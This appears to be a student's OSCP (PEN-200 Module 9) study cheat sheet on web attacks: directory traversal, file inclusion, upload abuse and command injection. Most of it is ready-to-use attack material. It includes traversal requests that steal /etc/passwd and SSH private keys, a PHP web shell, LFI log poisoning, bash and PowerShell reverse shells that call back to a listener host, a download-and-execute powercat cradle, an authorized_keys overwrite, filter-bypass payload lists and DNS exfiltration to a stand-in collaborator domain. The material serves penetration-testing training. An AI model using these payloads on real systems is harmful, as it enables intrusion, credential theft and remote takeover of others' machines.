# Web — Directories & Files (Traversal · Inclusion · Upload · Command Injection)

- Module: PEN-200 / Module 9 — Common Web Application Attacks (OSCP), **§9.1–9.5**
- URL: https://portal.offsec.com/courses/pen-200-44065/learning/common-web-application-attacks-44643
- Code/command blocks: ~35

> Terminal output is omitted; only commands, payloads & scripts are captured.
> Placeholders (BoxHelper.html): `{{TARGET_IP}}` target host, `{{URL}}` full base URL, `{{LHOST}}`/`{{LPORT}}` your Kali listener.
> These four bug classes all abuse how the app resolves **paths and files**: read a file (traversal), execute a file (inclusion), plant a file (upload), or run an OS command (injection).

> **⚡ Quick jump:** [9.1 Directory traversal](#91--directory-traversal) · [9.2.1 LFI + log poisoning](#921-local-file-inclusion-lfi) · [9.2.2 PHP wrappers](#922-php-wrappers) · [9.2.3 RFI](#923-remote-file-inclusion-rfi) · [9.3 File upload](#93--file-upload-vulnerabilities) · [9.4 Command injection](#94--command-injection) · [PortSwigger bypass cheats](#portswigger--bypass-cheat-sheets)

---

# 9.1 — Directory Traversal

> Read files **outside the web root** via relative (`../`) or absolute paths when user input is used unsanitised as a file path. Traversal only **reads** file contents (vs File Inclusion which **executes**). Linux test file: `/etc/passwd`; Windows: `C:\Windows\System32\drivers\etc\hosts`. Always try both `../` and `..\` on Windows targets.

## 9.1.1 Absolute vs relative paths

> `/etc/passwd` = absolute (from filesystem root). `../` climbs one directory; extra `../` past root are harmless, so pad generously when you don't know your depth (`../../../../../../../../../etc/passwd`).

## 9.1.2 Identifying and exploiting directory traversals

> Look for parameters that take a filename as value (e.g. `?page=admin.php`). Confirm the file loads directly, then swap in a traversal path. Test with curl/Burp, **not** the browser (browsers mangle output).

```bash
# vulnerable param -> read /etc/passwd
curl "{{URL}}/index.php?page=../../../../../../../../../etc/passwd"

# harvest an SSH private key found via /etc/passwd home dirs, then log in
curl "{{URL}}/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa"
```

```bash
# save the key, fix perms, connect (note custom SSH port)
chmod 400 dt_key
ssh -i dt_key -p 2222 offsec@{{TARGET_IP}}
```

> Windows leads when there's no `/etc/passwd`: IIS logs `C:\inetpub\logs\LogFiles\W3SVC1\`, config `C:\inetpub\wwwroot\web.config`.

## 9.1.3 Encoding special characters

> `../` is often filtered by the app/WAF/server. Bypass with **URL (percent) encoding** — the filter checks plaintext `../` but the server decodes `%2e%2e/` afterward. `.` = `%2e`, `/` = `%2f`. For the Apache 2.4.49 CVE-2021-41773 traversal, keep the path un-normalised with `--path-as-is`.

```bash
# encoded dots bypass a ../ filter
curl "http://{{TARGET_IP}}/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

# Apache 2.4.49 (CVE-2021-41773) — needs --path-as-is
curl --path-as-is "http://{{TARGET_IP}}/cgi-bin/../../../../etc/passwd"
```

---

# 9.2 — File Inclusion Vulnerabilities

> File inclusion **executes** the included file in the app's runtime (LFI = local file, RFI = remote file). PHP is the classic target; also Perl/ASP/ASPX/JSP/Node. RFI needs `allow_url_include=On` (off by default in modern PHP).

## 9.2.1 Local File Inclusion (LFI)

> Turn a read into **RCE via log poisoning**: write PHP into a file the server logs (e.g. Apache `access.log`), then include that log. The `User-Agent` header is attacker-controlled and gets logged.

PHP web shell snippet to plant in a logged field (e.g. via Burp, edit the `User-Agent`):

```php
<?php echo system($_GET['cmd']); ?>
```

```bash
# read the log first to confirm what's logged / where it is
curl "{{URL}}/index.php?page=../../../../../../../../../var/log/apache2/access.log"

# after poisoning the User-Agent, include the log and pass a command
# (spaces break the cmd -> URL-encode as %20; Windows XAMPP log: C:\xampp\apache\logs\access.log)
curl "{{URL}}/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=ls%20-la"
```

Upgrade to a reverse shell (wrap in `bash -c` so `sh` doesn't choke on the `>&` syntax, then URL-encode):

```bash
# plaintext payload
bash -c "bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1"

# URL-encoded, as the cmd value
# bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{{LHOST}}%2F{{LPORT}}%200%3E%261%22
nc -nvlp {{LPORT}}                                     # catch it
```

## 9.2.2 PHP wrappers

> `php://filter` reads source *without executing* it (base64-encode so PHP tags survive) — great for looting DB creds from `.php` files. `data://` achieves code execution inline (needs `allow_url_include=On`).

```bash
# read PHP source via filter (base64), then decode locally
curl "{{URL}}/index.php?page=php://filter/convert.base64-encode/resource=admin.php"
echo "<base64-blob>" | base64 -d

# data:// wrapper -> code execution (URL-encoded PHP)
curl "{{URL}}/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"

# data:// with base64 body to dodge keyword filters (e.g. "system")
echo -n '<?php echo system($_GET["cmd"]);?>' | base64
curl "{{URL}}/index.php?page=data://text/plain;base64,<b64>&cmd=ls"
```

## 9.2.3 Remote File Inclusion (RFI)

> Include a webshell you host. Kali ships PHP webshells in `/usr/share/webshells/php/`. Serve one over HTTP and include it via the vulnerable param. Needs `allow_url_include=On`.

```bash
# serve the webshell from the webshells dir
cd /usr/share/webshells/php/ && python3 -m http.server 80

# include it remotely and run a command
curl "{{URL}}/index.php?page=http://{{LHOST}}/simple-backdoor.php&cmd=ls"
```

> `simple-backdoor.php` takes `?cmd=`. Swap in pentestmonkey's `php-reverse-shell.php` (set `$ip`/`$port`) + a `nc` listener for a full shell.

---

# 9.3 — File Upload Vulnerabilities

> Three flavours: (1) upload a file the server **executes** (webshell), (2) upload combined with another bug (traversal to overwrite files, or XXE/XSS via SVG), (3) client-side (malicious macro doc needing a victim). Find upload points in avatars, CMS posts, career/CV forms.

## 9.3.1 Using executable files (webshell)

> If `.php` is blacklisted, bypass with alternate/altered extensions: `.phps`, `.php7`, `.phtml`, or **case change** `.pHP`. Then hit the uploaded shell.

```bash
# create a probe file, confirm uploads work; then upload simple-backdoor.pHP
echo "test" > test.txt

# run commands through the uploaded shell (lands in /uploads/ here)
curl "{{URL}}/uploads/simple-backdoor.pHP?cmd=dir"
```

Windows reverse shell via the webshell — base64-encode a PowerShell one-liner and run with `-enc`:

```powershell
# encode on Kali with pwsh
$Text = '$client = New-Object System.Net.Sockets.TCPClient("{{LHOST}}",{{LPORT}});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
[Convert]::ToBase64String($Bytes)
```

```bash
nc -nvlp {{LPORT}}                                     # listener
curl "{{URL}}/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20<BASE64>"
```

> Kali webshells for other stacks: `/usr/share/webshells/{asp,aspx,cfm,jsp,perl,php}`. If the extension is blocked, upload as `.txt` then rename via any file-management feature.

## 9.3.2 Using non-executable files

> When you can't execute the upload, chain it with **directory traversal in the filename** to overwrite a sensitive file. Classic: overwrite `root`'s `~/.ssh/authorized_keys` with your public key, then SSH in. (Web app may silently sanitise the path — try it as a last resort.)

```bash
ssh-keygen -f fileup                                   # make a keypair
cat fileup.pub > authorized_keys                       # this is the file you upload
```

> In Burp, intercept the upload and set `filename` to `../../../../../../../root/.ssh/authorized_keys`, forward it.

```bash
rm ~/.ssh/known_hosts                                  # avoid host-key mismatch on a new box
ssh -p 2222 -i fileup root@{{TARGET_IP}}
```

---

# 9.4 — Command Injection

> The app passes user input into an OS command. Inject with shell separators; on Windows determine CMD vs PowerShell, then pull a reverse shell. Detect by combining a known-good command with your own via a separator.

## 9.4.1 OS command injection

> Separators: `;` (PowerShell/Bash), `&&` / `||` (chained), `&` (also single-`&` on CMD), newline. URL-encode them: `;`=`%3B`, space=`%20`, `&`=`%26`. Send via curl `-X POST --data 'param=...'` (find the param name in Burp).

```bash
# baseline: does the raw command run? (here the 'git' param is allow-listed)
curl -X POST --data 'Archive=git version' http://{{TARGET_IP}}:8000/archive

# chain an injected command with an encoded semicolon
curl -X POST --data 'Archive=git%3Bipconfig' http://{{TARGET_IP}}:8000/archive
```

Determine the shell (CMD vs PowerShell) — PetSerAl snippet (URL-encode before sending):

```powershell
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```

Reverse shell via Powercat (Windows/PowerShell target):

```bash
# host powercat
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
python3 -m http.server 80
nc -nvlp {{LPORT}}                                     # in another tab
```

```powershell
# the injected command (download-cradle + powercat reverse shell); URL-encode the whole thing
IEX (New-Object System.Net.Webclient).DownloadString("http://{{LHOST}}/powercat.ps1");powercat -c {{LHOST}} -p {{LPORT}} -e powershell
```

> Linux target: inject a Bash reverse shell one-liner instead (`bash -c "bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1"`, URL-encoded).

---

# PortSwigger — Bypass Cheat Sheets

> Filter-bypass techniques from the PortSwigger Web Security Academy that extend the OSCP payloads. https://portswigger.net/web-security

## Directory traversal bypasses

```text
../../../etc/passwd                     # baseline
....//....//....//etc/passwd            # stripped-sequence bypass (filter removes one ../)
..%2f..%2f..%2fetc%2fpasswd             # URL-encoded
..%252f..%252f..%252fetc%252fpasswd     # double-encoded (%25 = %)
/var/www/images/../../../etc/passwd     # required-base-folder bypass (start inside expected dir)
../../../etc/passwd%00.png              # null byte, if a required .ext is appended (old PHP)
..%c0%af / ..%ef%bc%8f                  # overlong/unicode slash variants
```

## File-upload bypasses

- **Content-Type**: change the multipart `Content-Type` to `image/png` while keeping shell content.
- **Extension blacklist**: `.phtml .php3 .php4 .php5 .php7 .phar .pht`, or case `.pHp`.
- **Double / trailing**: `shell.php.jpg`, `shell.php.` , `shell.php%00.jpg`, `shell.php;.jpg`, `shell.asp;.jpg`.
- **Magic bytes / polyglot**: prepend real image header (e.g. `GIF89a;`) so content-sniffing passes.
- **`.htaccess` trick**: if you can upload `.htaccess`, map a new extension to the PHP handler: `AddType application/x-httpd-php .l33t`, then upload `shell.l33t`.
- **Path traversal in filename**: `filename="../shell.php"` to escape a non-executable upload dir into an executable one.
- **Race condition**: upload + request the file in a tight loop before AV/validation deletes it.

## Command-injection reference

```text
;   &   |   &&   ||   %0a(newline)         # command separators
`cmd`   $(cmd)                             # inline execution (Unix)
```

Blind detection (no output shown):

```bash
# time delay
& ping -c 10 127.0.0.1 &              # Unix
& ping -n 10 127.0.0.1 &              # Windows

# redirect output to a readable file under the web root, then fetch it
& whoami > /var/www/html/output.txt &

# out-of-band (OAST) — exfil via DNS/HTTP to a Burp Collaborator/your host
& nslookup `whoami`.yourcollab.example &
```

---

# 9.5 — Wrapping Up

> Traversal reads files; inclusion executes them (LFI+log-poisoning / wrappers / RFI); upload plants a shell or overwrites `authorized_keys`; command injection runs OS commands. Externally these give an initial foothold; internally they're lateral-movement vectors. Fingerprint the stack first — exploitation specifics (paths, log locations, shells) depend on OS + language. Next: injection into the database layer — see [attacks.md](attacks.md) (SQLi + XSS).
